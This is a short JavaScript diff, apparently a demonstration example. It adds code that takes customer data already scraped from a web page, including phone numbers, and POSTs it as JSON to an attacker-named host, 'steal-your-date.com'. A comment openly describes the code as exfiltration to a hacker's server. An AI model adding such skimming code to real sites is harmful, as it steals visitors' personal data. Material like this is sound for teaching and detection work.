@@ -17,3 +17,13 @@
         phone: customer.querySelector('.phone').innerText
       });
     });
+
+    /*
+     * Build a new HTTP request, and exfiltrate the previously collected
+     * data to the hacker's servers.
+     */
+
+    const http = new XMLHttpRequest();
+    http.open('POST', 'https:/steal-your-date.com/data', true);
+    http.setRequestHeader('Content-type', 'application/json');
+    http.send(JSON.stringify(customerData));
